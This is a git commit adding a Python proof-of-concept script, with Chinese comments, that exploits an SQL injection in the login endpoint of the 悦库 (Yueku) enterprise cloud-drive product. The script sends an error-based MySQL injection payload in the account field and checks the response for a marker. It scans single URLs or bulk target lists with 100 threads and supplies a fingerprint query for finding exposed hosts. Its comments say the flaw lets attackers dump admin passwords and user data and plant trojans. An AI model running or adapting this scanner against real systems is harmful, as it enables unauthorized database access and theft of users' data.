5c530eb7550f3d44d179610e2ecff8ac7d7466bd
Sarah0x7e <165890913+Sarah0x7e@users.noreply.github.com>
2024-06-22 18:34:48 +0800

    Add files via upload

---
+++ YKQY_user_sql.py
@@ -0,0 +1,86 @@
+#悦库企业网盘 登录框接口/user/login/.html处存在SQL注入漏洞,未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+#app="悦库-悦库网盘"
+# 导包
+import requests,sys,argparse,re
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
+from colorama import Fore, Style
+BLUE = Fore.BLUE
+RESET = Style.RESET_ALL
+# 指纹模块
+def banner():
+    banner = """
+
+ ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
+▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
+▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
+░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
+ ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
+ ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
+  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
+  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
+      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
+                                     ░                                                        
+                                    author:           🐖sawa🐇
+                                    version:          1.0.0
+                                    For:              悦库企业网盘 SQL注入漏洞
+"""
+    print(banner)
+
+# poc模块
+def poc(target):
+    payload_url ="/user/login/.html"
+    url = target+payload_url
+    headers = {
+        'Accept':'application/json, text/javascript, */*; q=0.01',
+        'Accept-Encoding':'gzip, deflate',
+        'X-Requested-With':'XMLHttpRequest',
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
+        'Content-Type':'application/x-www-form-urlencoded',
+        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+        'Priority':'u=1',
+    }
+    data = "account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,user()))),0x7e),5597)-- HZLK"
+    try:
+        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
+        if res.status_code == 200 and '~' in res.text:
+            print(f"{BLUE}[+]该站点存在sql注入漏洞,url:{target}{RESET}")
+            with open ('result.txt','a',encoding='utf-8') as fp:
+                fp.write(target+"\n")
+        else :
+            print("[-]该站点不存在sql注入漏洞 ,url:"+target)
+            with open ('without-bug.txt','a',encoding='utf-8') as fp:
+                fp.write(target+"\n")        
+    except Exception as e:
+        print("[*]连接出现问题，请手动进行测试该站点,url:"+target)
+        with open ('warning.txt','a',encoding='utf-8') as fp:
+            fp.write(target+"\n")
+# 主函数模块
+def main():
+    # 先调用指纹
+    banner()
+    # 描述信息
+    parser = argparse.ArgumentParser(description="this is a 悦库企业网盘 SQL注入漏洞")
+    # -u指定单个url检测， -f指定批量url进行检测
+    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
+    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
+    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
+    # 调用
+    args = parser.parse_args()
+    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+# 主函数入口
+if __name__ == "__main__":
+    main()
